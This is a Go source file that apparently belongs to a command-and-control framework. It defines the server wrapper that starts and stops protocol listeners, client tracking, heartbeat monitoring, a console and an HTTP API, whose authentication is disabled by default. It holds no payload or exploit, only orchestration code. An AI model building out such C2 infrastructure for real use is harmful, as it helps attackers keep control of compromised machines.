package cli

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/Cl0udRs4/dinot/internal/server/api"
	"github.com/Cl0udRs4/dinot/internal/server/client"
	"github.com/Cl0udRs4/dinot/internal/server/listener"
	"github.com/Cl0udRs4/dinot/internal/server/logging"
)

// Server represents the C2 server with console interface
type Server struct {
	// listenerManager manages protocol listeners
	listenerManager *listener.ListenerManager
	
	// clientManager manages connected clients
	clientManager *client.ClientManager
	
	// heartbeatMonitor monitors client heartbeats
	heartbeatMonitor *client.HeartbeatMonitor
	
	// console is the command-line interface
	console *Console
	
	// apiHandler is the HTTP API handler
	apiHandler *api.APIHandler
	
	// logger is the logging system
	logger logging.Logger
	
	// monitorManager monitors exceptions and handles reconnection
	monitorManager *logging.MonitorManager
}

// NewServer creates a new C2 server with console interface
func NewServer() *Server {
	// Initialize logger
	logger := logging.GetLogger()
	logger.SetLevel(logging.InfoLevel)
	
	clientManager := client.NewClientManager()
	heartbeatMonitor := client.NewHeartbeatMonitor(clientManager, 30*time.Second, 60*time.Second)
	
	// Create default listener config
	defaultConfig := listener.Config{
		Address:        "0.0.0.0:8080",
		BufferSize:     4096,
		MaxConnections: 100,
		Timeout:        30,
	}
	
	listenerManager := listener.NewListenerManager(defaultConfig)
	
	// Create API handler
	apiConfig := api.Config{
		Address:      "127.0.0.1:8081",
		AuthEnabled:  false,
		AuthUser:     "",
		AuthPassword: "",
		JWTSecret:    "",
		JWTEnabled:   false,
	}
	
	apiHandler := api.NewAPIHandler(clientManager, heartbeatMonitor, apiConfig)
	
	// Create monitor manager
	monitorConfig := logging.MonitorConfig{
		CheckInterval:        1 * time.Minute,
		ReconnectInterval:    10 * time.Second,
		MaxReconnectAttempts: 5,
	}
	
	monitorManager := logging.NewMonitorManager(logger, clientManager, monitorConfig)
	
	return &Server{
		listenerManager:  listenerManager,
		clientManager:    clientManager,
		heartbeatMonitor: heartbeatMonitor,
		console:          NewConsole(clientManager, heartbeatMonitor),
		apiHandler:       apiHandler,
		logger:           logger,
		monitorManager:   monitorManager,
	}
}

// Start starts the C2 server and console interface
func (s *Server) Start() error {
	// Log server start
	s.logger.Info("Starting C2 server", map[string]interface{}{
		"time": time.Now().Format(time.RFC3339),
	})
	
	// Start the heartbeat monitor
	s.heartbeatMonitor.Start()
	s.logger.Info("Heartbeat monitor started", nil)
	
	// Start the monitor manager
	s.monitorManager.Start()
	s.logger.Info("Monitor manager started", nil)
	
	// Set up signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	
	go func() {
		<-sigChan
		s.logger.Info("Received shutdown signal", nil)
		fmt.Println("\nShutting down...")
		s.Stop()
		os.Exit(0)
	}()
	
	// Start the API server in a goroutine
	go func() {
		apiAddress := "127.0.0.1:8081"
		s.logger.Info("Starting HTTP API server", map[string]interface{}{
			"address": apiAddress,
		})
		fmt.Printf("Starting HTTP API server on %s\n", apiAddress)
		if err := s.apiHandler.Start(apiAddress); err != nil {
			s.logger.Error("Error starting API server", map[string]interface{}{
				"error": err.Error(),
			})
			fmt.Printf("Error starting API server: %v\n", err)
		}
	}()
	
	// Start the console interface
	s.logger.Info("Starting console interface", nil)
	s.console.Start()
	
	return nil
}

// Stop stops the C2 server and console interface
func (s *Server) Stop() {
	s.logger.Info("Stopping C2 server", nil)
	
	// Stop the console interface
	s.logger.Info("Stopping console interface", nil)
	s.console.Stop()
	
	// Stop the monitor manager
	s.logger.Info("Stopping monitor manager", nil)
	s.monitorManager.Stop()
	
	// Stop the heartbeat monitor
	s.logger.Info("Stopping heartbeat monitor", nil)
	s.heartbeatMonitor.Stop()
	
	// Stop all listeners
	s.logger.Info("Stopping all listeners", nil)
	s.listenerManager.HaltAll()
	
	s.logger.Info("C2 server stopped", nil)
}

// GetClientManager returns the client manager
func (s *Server) GetClientManager() *client.ClientManager {
	return s.clientManager
}

// GetHeartbeatMonitor returns the heartbeat monitor
func (s *Server) GetHeartbeatMonitor() *client.HeartbeatMonitor {
	return s.heartbeatMonitor
}

// GetListenerManager returns the listener manager
func (s *Server) GetListenerManager() *listener.ListenerManager {
	return s.listenerManager
}

// GetLogger returns the logger
func (s *Server) GetLogger() logging.Logger {
	return s.logger
}

// GetMonitorManager returns the monitor manager
func (s *Server) GetMonitorManager() *logging.MonitorManager {
	return s.monitorManager
}
